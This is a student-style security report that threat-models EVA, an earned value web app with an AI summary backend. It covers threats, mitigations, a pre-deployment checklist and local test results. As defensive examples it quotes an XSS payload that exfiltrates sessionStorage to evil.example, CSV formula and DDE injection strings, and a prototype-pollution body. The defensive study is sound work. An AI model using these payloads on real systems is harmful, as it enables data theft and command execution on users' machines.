# EVA — Part B: Cybersecurity Analysis

Assignment Part B (questions 6–11) for **EVA**, the Earned Value Analysis web application in this
repository (with its Electron desktop wrapper, `EVA_Desktop`). Every control described as
"already in EVA" was checked in the source code, and the tests in §5 were run on **2026-11-12**
with safe test data. Nothing in this analysis sent data to the real AI provider.

## 1. The system being analysed

EVA turns four project values (BAC, PV, EV, AC) into cost and schedule indicators, charts, a CSV
report, and an optional AI-written summary.

| Component              | What it does                                                                                                       | Data it handles                                                                                                |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------- |
| Frontend (React, Vite) | Forms, validation, all EVA calculations, charts, CSV export, CSV/XLSX import. Runs entirely in the user's browser. | Project name, description, manager, reporting date, the four values. Kept in `sessionStorage` (this tab only). |
| File import            | Reads one row of a `.csv` or `.xlsx` file in a Web Worker, in the browser. The file is never uploaded.             | User-supplied files (untrusted input).                                                                         |
| AI backend (Node.js)   | One endpoint, `POST /api/ai-summary`. Recalculates the metrics and asks the Groq AI service to explain them.       | Receives only the currency and the four numbers. Holds the Groq API key.                                       |
| Groq AI service        | Third-party language model (`openai/gpt-oss-120b`).                                                                | Receives the four numbers and calculated metrics; returns JSON text.                                           |
| Desktop app (Electron) | Same frontend and backend in a desktop window.                                                                     | Same as above.                                                                                                 |

**Assumption for "deployed online":** the frontend is hosted as static files, the AI backend runs
on a server behind HTTPS, and the Groq key is stored on that server. Today EVA runs locally
(backend on `127.0.0.1` only), so several mitigations below are marked as **needed before going
online**.

**Assets to protect:** (1) confidentiality of project data (budgets are commercially sensitive),
(2) integrity of the calculated results (users make cost decisions from them), (3) the Groq API
key and its paid quota, (4) availability of the service, (5) the user's own computer (files they
download and open).

## 2. Questions 6–8: Threats, attack scenarios, and mitigations

Eight threats are identified. For each: a realistic scenario (Q7), the controls EVA already has,
and what to add (Q8).

### T1. Exposure of the AI provider's API key

- **Scenario:** while deploying, a developer puts the key in a `VITE_GROQ_API_KEY` variable so the
  browser can call Groq directly, or commits `server/.env` to a public GitHub repository. Vite
  copies `VITE_` variables into the public JavaScript bundle; bots scan GitHub and websites for
  `gsk_…` keys within minutes. The attacker uses the key for their own workloads, exhausting the
  quota (EVA's AI summary stops working) and running up charges or getting the account banned.
- **Already in EVA:**
  - The key lives only in the backend's Git-ignored `server/.env`; the browser never calls Groq.
  - The backend **refuses to start** if a secret-like variable uses the `VITE_` prefix
    (`server/config.ts`).
  - `pnpm check:build` scans the built frontend for the Groq URL, the key's variable name, an
    `Authorization` header, or a key-shaped string, and fails the build if any is found.
  - The key is wrapped in a `Secret` type that never prints, and the logger records only a request
    id, time, status, error code, and duration.
- **Add for online deployment:** store the key in the host's secret manager (not a file); add
  automatic secret scanning to the repository (for example GitHub secret scanning or `gitleaks`
  as a pre-commit hook); set a spending limit and usage alerts on the Groq account; rotate the key
  immediately if it is ever exposed.

### T2. Abuse of the AI endpoint (denial of service and "denial of wallet")

- **Scenario:** once EVA is online, an attacker writes a script that sends thousands of valid
  requests to `/api/ai-summary`. Each one makes a paid Groq call. Within minutes the per-minute
  quota is exhausted, so genuine users see "Too many requests", and the account owner pays for
  the attacker's traffic.
- **Already in EVA:**
  - Requests must be small (2 KB maximum), JSON, `POST`, to the exact route, with a valid schema.
  - Server timeouts: 5 s for headers, 10 s per request, and a provider deadline.
  - Exactly one Groq call per request and **no automatic retries**.
  - The frontend allows only one pending request per tab, and shows Groq's "try again in N
    seconds" message instead of retrying.
- **Gap (demonstrated in §5, Test 3):** the backend has **no per-client rate limit**: 300 rapid
  requests were all accepted. The Origin check does not stop this online, because a script can
  send any `Origin` header it likes; it only stops other websites running in a victim's browser.
- **Add for online deployment:** per-IP and global rate limits (for example 5 requests per minute
  per IP, a daily cap), a bot check such as a CAPTCHA before generation, caching of summaries for
  identical inputs (the inputs are just four numbers), and Groq spending alerts.

### T3. Malicious file import

- **Scenario:** an attacker emails a project manager "the updated project figures" as an `.xlsx`
  file that is really a zip bomb (tiny on disk, gigabytes when unpacked), an executable renamed to
  `.csv`, or a file with thousands of rows. Opening it in EVA could freeze or crash the browser,
  or try to exploit the spreadsheet parser.
- **Already in EVA:**
  - Files are read **only in the browser**, in a separate Web Worker with a 10-second timeout; they
    are never uploaded to a server.
  - Checks before reading: extension and type (`.csv` or `.xlsx` only), size at most 1 MiB, not
    empty. Checks after reading: at most 100 rows, 50 columns, and 100 characters per cell.
  - Zip-bomb limits for `.xlsx`: at most 200 entries, 10 MiB per entry and 20 MiB in total when
    unpacked, a compression ratio of at most 200, and at most 50 worksheets.
  - Imported values are only shown in a preview and fill the form only after the user clicks
    "Use these values"; invalid rows cannot be used.
- **Add:** keep the parser (`read-excel-file`) up to date and fuzz-test the importer with
  malformed files.

### T4. CSV formula injection in the downloaded report

- **Scenario:** an attacker gets a formula into a text field that ends up in the CSV report, for
  example a project name of `=HYPERLINK("http://evil.example/steal?d="&A1,"Click for details")`
  on a shared lab computer or in a template they circulate. When the project manager opens the
  report in Excel, the cell becomes a live link that sends spreadsheet data to the attacker when
  clicked; older Excel versions could even run commands through DDE (`=cmd|'/C calc'!A0`).
- **Already in EVA:** every text cell in the export is neutralized: if it starts with `=`, `+`,
  `-`, `@` (including the full-width forms), a tab, a carriage return, or spaces followed by one
  of these, an apostrophe is added so spreadsheets show it as text. Fields are then escaped
  according to RFC 4180 (quotes doubled, fields with commas or line breaks quoted). Numbers are
  written as plain numbers and never altered.
- **Add:** keep the unit tests for this in the release checklist; advise users to keep Excel's
  protected view and external-content warnings enabled.

### T5. Cross-site scripting (XSS) and malicious AI output

- **Scenario:** an attacker gets script into the page, for example a project description of
  `<img src=x onerror="fetch('https://evil.example/?d='+sessionStorage.getItem('…'))">`, or a
  compromised or manipulated AI response containing HTML, a fake link, or invented figures. If
  rendered as HTML, the script could read the project data, change the displayed results, or show
  a phishing message inside a trusted page.
- **Already in EVA:**
  - All text is rendered by React as text; the code contains **no** `dangerouslySetInnerHTML`
    or `innerHTML` (checked).
  - The AI text is displayed as plain text only, after strict validation: the response must match
    a fixed JSON schema, stay under a size limit, and contain no numbers that EVA did not
    calculate, otherwise it is discarded. Values shown next to the AI text come from EVA's own
    calculation.
  - The AI receives **no free text** from users (only a currency code and four numbers), so a user
    cannot plant instructions for the model (prompt injection).
- **Gap:** the app does not yet send a **Content-Security-Policy** header.
- **Add for online deployment:** a strict Content-Security-Policy (`default-src 'self'`, no inline
  scripts, `connect-src 'self'`, `frame-ancestors 'none'`), plus `X-Content-Type-Options`,
  `Referrer-Policy`, and HSTS headers on the hosting platform.

### T6. Cross-origin attacks on the backend (CSRF and DNS rebinding)

- **Scenario:** a user runs EVA on their laptop and, in another tab, visits a malicious website.
  That site's JavaScript sends requests to `http://127.0.0.1:8787/api/ai-summary` to burn the
  user's Groq quota, or uses DNS rebinding (making `evil.example` resolve to `127.0.0.1`) to get
  around the browser's same-origin rules.
- **Already in EVA:**
  - The backend listens on `127.0.0.1` only, so other computers on the network cannot connect.
  - The `Host` header must be `127.0.0.1:8787` or `localhost:8787`, which defeats DNS rebinding.
  - The `Origin` header must be EVA's own frontend; requests without it are refused.
  - Only `application/json` is accepted, so a plain HTML form cannot submit a request.
  - No CORS headers are sent, so other websites cannot read any response.
- **Add for online deployment:** replace the local origins with the production domain only, and
  keep HTTPS-only cookies off the API (it needs none).

### T7. Exposure of confidential project data

- **Scenario:** project budgets are sensitive. Data could leak through the AI provider (if project
  names or descriptions were sent), server logs, an attacker requesting another user's project
  from the server, or a shared computer where the next person opens the previous user's tab.
- **Already in EVA:**
  - There are **no accounts and no server-side storage**, so there is no project database to
    break into, and no endpoint returns project data.
  - The AI request schema accepts **only** the currency and the four numbers; a request containing
    a project name or any other extra field is rejected (demonstrated in §5, Test 2).
  - Data is kept in `sessionStorage`, which belongs to one browser tab and is deleted when the tab
    closes; "Start a new analysis" clears it immediately after a confirmation.
  - Logs contain no prompts, responses, project data, or keys.
- **Add:** a short privacy notice that names Groq as the AI provider; HTTPS everywhere.

### T8. Supply-chain compromise

- **Scenario:** a popular npm package that EVA depends on is hijacked and a malicious version
  published. The next `pnpm install` pulls it in, and the injected code steals project data from
  every user, or the Groq key from the server.
- **Already in EVA:** few runtime dependencies (React, the Geist fonts, lucide icons, and one
  spreadsheet reader); a lockfile pins exact versions; the local pnpm policy delays newly
  published versions (minimum release age); the desktop app allows only Electron to run an
  install script.
- **Add:** `pnpm audit` and automated dependency alerts in CI, review of changes on upgrade, and
  installing from the lockfile only (`pnpm install --frozen-lockfile`) in deployment.

## 3. Question 9: The three threats with the greatest harm to users

Harm was judged by **impact on the user** (their data, their decisions, their computer) and
**likelihood once EVA is online**.

1. **T5. Cross-site scripting and malicious AI output.** Script running in EVA's page has full
   access to everything the user entered, and can silently change the displayed CPI, SPI, or EAC.
   EVA's purpose is to support financial decisions, so falsified results that look trustworthy
   are the most damaging outcome: the user is harmed without noticing. It is also the threat with
   an open gap today (no Content-Security-Policy).
2. **T4. CSV formula injection.** It is the only threat that reaches **outside the browser
   sandbox**: the attack runs in Excel on the user's own computer, where it can send spreadsheet
   contents to an attacker or, with DDE, run commands. Exported reports are shared with managers
   and clients, so one poisoned field can reach many people.
3. **T7. Exposure of confidential project data.** Budgets, costs, and project names are
   commercially sensitive; a leak can breach contracts or give competitors an advantage, and it
   cannot be undone. Sending data to a third-party AI service makes this a realistic risk for an
   AI-assisted tool.

**Why not T1 or T2?** A leaked key or a flooded AI endpoint mainly harms the **operator** (cost,
quota) and causes a temporary loss of the optional AI summary; the calculated report keeps
working, and no user data is exposed. They remain high priorities for the operator and are
covered first in the checklist.

## 4. Question 10: Pre-deployment security checklist

Status: ✅ already in EVA · ⬜ to do before going online.

**Secrets**

- ✅ API key only on the server; never in frontend code or `VITE_` variables (startup check).
- ✅ Build scanned for secrets (`pnpm check:build`) before every release.
- ⬜ Key stored in the hosting platform's secret manager; `.env` files not deployed.
- ⬜ Repository secret scanning enabled; key rotation procedure written down.
- ⬜ Spending limit and usage alerts set on the Groq account.

**Network and transport**

- ⬜ HTTPS only, with HSTS; HTTP redirects to HTTPS.
- ⬜ Backend `Host` and `Origin` allowlists changed from `127.0.0.1:5173` to the production domain.
- ✅ No CORS headers; only `POST` with `application/json` to one route.

**Abuse protection**

- ✅ 2 KB request limit, request and header timeouts, provider deadline, no automatic retries.
- ⬜ Per-IP and global rate limits, and a daily cap on AI summaries.
- ⬜ Bot protection (CAPTCHA) before AI generation; caching for identical inputs.

**Browser security headers**

- ⬜ Content-Security-Policy (`default-src 'self'`, no inline scripts, `frame-ancestors 'none'`).
- ⬜ `X-Content-Type-Options: nosniff` and `Referrer-Policy: no-referrer` on the static site
  (the API already sends `nosniff` and `Cache-Control: no-store`).

**Input and output handling**

- ✅ All values validated (finite, non-negative, BAC > 0, PV and EV ≤ BAC) in the browser and again
  on the server; division by zero shown as N/A.
- ✅ Import limits (type, 1 MiB, 100 rows, zip-bomb limits, worker timeout); preview before use.
- ✅ CSV export neutralizes formulas and escapes fields (RFC 4180).
- ✅ No raw HTML rendering; AI output validated against a schema and shown as text.

**Privacy**

- ✅ AI receives only the currency and four numbers; extra fields rejected.
- ✅ No accounts, no server storage; logs without personal or project data.
- ⬜ Privacy notice naming the AI provider.

**Dependencies and build**

- ✅ Lockfile committed; few runtime dependencies.
- ⬜ `pnpm audit` and dependency alerts in CI; deploy with `--frozen-lockfile`.

**Testing and monitoring**

- ✅ `pnpm verify` (type check, lint, format, 587 unit tests) and `pnpm test:e2e` (60 browser tests
  including accessibility) pass.
- ⬜ The security tests in §5 re-run against the deployed environment.
- ⬜ Monitoring and alerts for error rates and 429 responses; an incident contact.

**Desktop app (if distributed)**

- ✅ Sandboxed window: context isolation, no Node.js in the page, navigation to other sites blocked,
  all permission requests denied.
- ⬜ Never bundle the API key into an installer; sign the installer.

## 5. Question 11: Security tests with safe test data

All tests were run on 2026-11-12 on a local machine. **No real AI request was made:** the API tests
used a separate instance of EVA's real API server code (`createApiServer`, the same checks and
limits) on port 18787, connected to a generator that never contacts Groq. Browser tests used the
production build of the frontend in headless Chromium (Playwright). The test files were harmless
(an "executable" is 204 bytes of zeros after the `MZ` header; the zip bomb contains only zeros).

### Test 1: Invalid and malicious file uploads

**Method:** on the EVA inputs step, BAC was set to `5000`, then each file was chosen in
"Import from file". A test passes if the file is rejected with a clear message, "Use these values"
is not available, and the form is unchanged.

| Test file                | Safe test data                                 | Result shown by EVA                                                                                      | Form unchanged | Result |
| ------------------------ | ---------------------------------------------- | -------------------------------------------------------------------------------------------------------- | -------------- | ------ |
| `malware.exe`            | 204-byte fake executable (`MZ` header, zeros)  | "This file type is not supported. Choose a .csv or .xlsx file."                                          | Yes            | Pass   |
| `setup.csv.exe`          | Double-extension trick                         | "This file type is not supported. Choose a .csv or .xlsx file."                                          | Yes            | Pass   |
| `disguised-workbook.csv` | ZIP (workbook) bytes with a `.csv` name        | "This file looks like an Excel workbook saved with a .csv name. Rename it to .xlsx or export it as CSV." | Yes            | Pass   |
| `huge.csv`               | 2.2 MB of valid rows                           | "This file is larger than 1 MiB (1,048,576 bytes)."                                                      | Yes            | Pass   |
| `zip-bomb.xlsx`          | 51 KB file that unpacks to 50 MB of zeros      | "This workbook is too large or complex to import safely."                                                | Yes            | Pass   |
| `too-many-rows.csv`      | 500 data rows                                  | "The file has 500 data rows. Import files can contain at most 100."                                      | Yes            | Pass   |
| `formula.csv`            | `=HYPERLINK(...)` in BAC, unquoted             | "The file could not be read. Line 2 has a quotation mark inside an unquoted value."                      | Yes            | Pass   |
| `formula-quoted.csv`     | `=HYPERLINK(...)` in BAC, correctly quoted CSV | Shown as plain text in the preview; "Row 2, BAC: Enter BAC as a number"; 0 rows can be imported          | Yes            | Pass   |
| `empty.csv`              | 0 bytes                                        | "This file is empty."                                                                                    | Yes            | Pass   |

**Follow-up on the export side (T4):** the same attack strings were passed through EVA's CSV
writer (`src/features/export/csv.ts`):

| Text entered                                       | Written to the CSV                                        |
| -------------------------------------------------- | --------------------------------------------------------- |
| `=HYPERLINK("http://evil.example/steal","Click…")` | `"'=HYPERLINK(""http://evil.example/steal"",""Click…"")"` |
| `+cmd\|' /C calc'!A0`                              | `'+cmd\|' /C calc'!A0`                                    |
| `@SUM(1+1)*cmd\|' /C calc'!A0`                     | `'@SUM(1+1)*cmd\|' /C calc'!A0`                           |
| `  =1+1` (leading spaces)                          | `'  =1+1`                                                 |
| Text with a line break, quotes, and commas         | Quoted field, quotes doubled, line break kept             |

The leading apostrophe makes spreadsheets treat each value as text. The import and export unit
test suites (9 files, 124 tests) also pass.

### Test 2: Unauthorized access

EVA has no accounts and stores no projects on a server, so there is no other user's project to
request. The test therefore checks that nobody else can use the backend, and that the backend
never accepts project data.

| Attempt (safe test request)                                           | Expected           | Actual                   | Result |
| --------------------------------------------------------------------- | ------------------ | ------------------------ | ------ |
| Valid request with **no** `Origin` header (a script or other program) | 403                | 403 `forbidden`          | Pass   |
| Request from a foreign website (`Origin: https://evil.example`)       | 403                | 403 `forbidden`          | Pass   |
| Forged `Host: evil.example` (DNS rebinding)                           | 403                | 403 `forbidden`          | Pass   |
| Probing another path (`/api/projects`)                                | 404                | 404 `not_found`          | Pass   |
| `GET` instead of `POST`                                               | 405                | 405 `method_not_allowed` | Pass   |
| Request carrying project data (`"projectName": "Secret merger"`)      | 400                | 400 `invalid_request`    | Pass   |
| Prototype-pollution payload (`"__proto__": {"admin": true}`)          | 400                | 400 `invalid_request`    | Pass   |
| Invalid values (PV above BAC, negative AC)                            | 422                | 422 `invalid_inputs`     | Pass   |
| `text/plain` body (what a cross-site HTML form would send)            | 415                | 415 `unsupported_media`  | Pass   |
| Connecting from the network (the machine's LAN address)               | Connection refused | Connection refused       | Pass   |

### Test 3: Excessive requests

| Attempt                                   | Expected               | Actual                                              | Result      |
| ----------------------------------------- | ---------------------- | --------------------------------------------------- | ----------- |
| 1 MB request body (limit 2 KB)            | 413                    | 413 `payload_too_large`                             | Pass        |
| One valid request (reference)             | Reaches generation     | 503 `ai_not_configured` (test generator)            | Pass        |
| Flood: 300 valid requests, 50 at a time   | Server stays up        | All 300 handled in 0.25 s; server stayed responsive | Pass        |
| Flood: are excess requests **throttled**? | Some rejected with 429 | **None rejected:** all 300 reached generation       | **Finding** |

The server withstood the flood, but the last row confirms the gap described in T2: without a
rate limit, each of those 300 requests would have been a paid Groq call in an online deployment.
When Groq itself limits the account, EVA already returns `429 rate_limited` with a `Retry-After`
value, and the page shows "Too many requests. Try again in N seconds" without retrying (covered by
the backend unit tests).

### How to reproduce

- Unit and browser tests: `pnpm verify` and `pnpm test:e2e` in `EVA_Web`.
- API tests: start the API server code on a spare port with a generator that does not contact
  Groq (never run these against a backend that holds the real key), then send the requests above
  with `curl`, for example:

  ```bash
  curl -i -X POST http://127.0.0.1:18787/api/ai-summary \
    -H 'Content-Type: application/json' -H 'Origin: https://evil.example' \
    -d '{"schemaVersion":1,"currency":"USD","inputs":{"bac":100000,"pv":40000,"ev":35000,"ac":42000}}'
  # → HTTP/1.1 403 Forbidden
  ```

- File tests: create the files described in the Test 1 table (for example with Python's
  `zipfile` module for the zip bomb) and choose them in "Import from file".

## 6. Findings and conclusion

EVA's design removes several common risks: there is no database or account system to attack,
files never leave the browser, the AI never receives free text or project details, and the API key
never reaches the frontend. All file and access-control tests passed.

Three items must be fixed **before EVA is deployed online**:

1. **Rate limiting on the AI endpoint** (T2, shown by Test 3).
2. **A Content-Security-Policy and security headers** on the hosted site (T5).
3. **Production configuration of secrets and origins**: key in a secret manager with spending
   alerts, and the `Host`/`Origin` allowlists set to the production domain (T1, T6).

**Limitations of this analysis:** the tests ran locally, not against a deployed server; the `Origin`
check is a browser protection, not authentication, and does not stop scripts once the API is
public; the Groq service itself was not tested; and the browser tests used Chromium only.
